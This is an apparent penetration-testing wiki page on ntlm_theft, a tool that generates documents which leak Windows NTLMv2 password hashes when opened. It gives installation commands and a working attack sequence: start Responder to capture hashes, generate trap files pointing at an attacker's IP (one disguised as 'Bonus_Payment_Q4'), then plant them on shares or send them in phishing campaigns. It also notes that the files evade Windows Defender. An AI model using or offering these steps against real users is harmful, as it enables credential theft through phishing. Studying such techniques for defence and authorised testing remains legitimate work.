# NTLM Theft

{% embed url="https://github.com/Greenwolf/ntlm_theft" %}

> _A tool for generating multiple types of NTLMv2 hash theft files._
>
> _ntlm\_theft is an Open Source Python3 Tool that generates 21 different types of hash theft documents. These can be used for phishing when either the target allows smb traffic outside their network, or if you are already inside the internal network._
>
> _The benefits of these file types over say macro based documents or exploit documents are that all of these are built using "intended functionality". None were flagged by Windows Defender Antivirus on June 2020, and 17 of the 21 attacks worked on a fully patched Windows 10 host._

{% code title="Installation" %}
```bash
git clone https://github.com/Greenwolf/ntlm_theft
cd ntlm_theft/

python3 -m venv ntlm_theft_venv
source ntlm_theft_venv/bin/activate

pip3 install xlsxwriter
```
{% endcode %}



## Practical

Set up Responder tool to receive NTLM credentials

```bash
sudo responder -I eth0
```

Now generate the trap file with `ntlm_theft` script.

```bash
python3 ntlm_theft.py -g all -s 127.0.0.1 -f test # all file generated
python3 ntlm_theft.py -g modern -s 127.0.0.1 -f meeting # only modern file generated
python3 ntlm_theft.py -g xlsx -s 192.168.1.103 -f Bonus_Payment_Q4 # only one file gen
```

Then, upload this file in a FTP directory, SMB share or using it in a Phishing campaign.

Lastly, wait that a user open that file and responder catch the credentials.



